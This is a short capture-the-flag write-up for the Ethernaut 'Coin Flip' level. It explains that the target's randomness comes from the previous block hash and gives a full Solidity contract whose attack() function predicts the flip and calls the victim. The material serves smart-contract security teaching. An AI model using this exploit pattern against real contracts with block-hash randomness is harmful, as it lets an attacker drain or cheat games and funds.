# Coinflip

The contract `breakcoinflip.sol`, and more specifically, the attack() function, is what takes advantage of the contract.

The vulnerability of Coin Flip lies in the fact that it takes the result from getting the random value from the hash of the latest block. Although the hash itself is random, we can get that random value at the time of the flip() execution, so that we can predict the result of the calculation, and thus win the game.

The attack() function automates the calculation and the call to the flip() function.


Contract code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


//Contract meant for breaking the Coin Flip smart contract from ethernaut:
//https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF

contract BreakCoinflip {
    
    address victim;
    address owner;


    constructor(address ownerAddr ,address victimAddress) {
        victim = victimAddress;
        owner = ownerAddr;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    function attack() external onlyOwner returns (bool, bytes memory){
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;            
        (bool success, bytes memory data ) = victim.call(
            abi.encodeWithSignature("flip(bool)", side)
        );
        return (success, data);
    }

    
}
```

